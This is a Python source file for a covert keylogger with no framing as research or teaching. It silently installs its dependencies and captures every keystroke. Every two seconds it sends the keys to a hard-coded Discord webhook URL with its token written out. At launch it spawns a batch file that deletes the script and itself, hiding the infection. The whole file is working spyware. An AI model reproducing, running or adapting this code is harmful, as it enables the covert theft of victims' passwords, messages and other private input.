import os
import sys
import time
import threading

# --- Ensure Dependencies ---
def install_if_missing(package):
    try:
        __import__(package)
    except ImportError:
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

for pkg in ["pynput", "requests"]:
    install_if_missing(pkg)

# --- Imports after ensuring installation ---
import requests
from pynput import keyboard

# --- Configuration ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1360081058351153152/qt2xAqDS6h58Qwu9BxIiRRZR04Xc4SMCsxLp-rCH0eLgS5HD6lpfHLUJ64155wFSFM6r"

key_buffer = []
lock = threading.Lock()

# --- Self-delete logic ---
def self_delete():
    time.sleep(1)
    try:
        exe_path = os.path.abspath(sys.argv[0])
        bat_path = exe_path + '.bat'
        with open(bat_path, 'w') as f:
            f.write(f"""@echo off
timeout /t 2 > nul
del "{exe_path}" > nul
del "{bat_path}" > nul
""")
        os.system(f'start "" /b cmd /c "{bat_path}"')
    except Exception as e:
        print("Self-delete failed:", e)

# --- Webhook sender ---
def send_webhook(content):
    try:
        requests.post(WEBHOOK_URL, json={"content": content})
    except Exception as e:
        print("Failed to send webhook:", e)

# --- Format keys nicely ---
def format_key(key):
    try:
        return key.char  # letters/numbers
    except AttributeError:
        return str(key).replace('Key.', '').lower()  # special keys

# --- Key event handler ---
def on_press(key):
    with lock:
        key_buffer.append(format_key(key))

# --- Periodic sender thread ---
def message_loop():
    while True:
        time.sleep(2)
        with lock:
            if key_buffer:
                message = f"{' '.join(key_buffer)}"
                send_webhook(message)
                key_buffer.clear()

# --- Keyboard listener thread ---
def listen_keys():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# --- Main execution ---
if __name__ == "__main__":
    threading.Thread(target=self_delete, daemon=True).start()
    threading.Thread(target=message_loop, daemon=True).start()
    listen_keys()
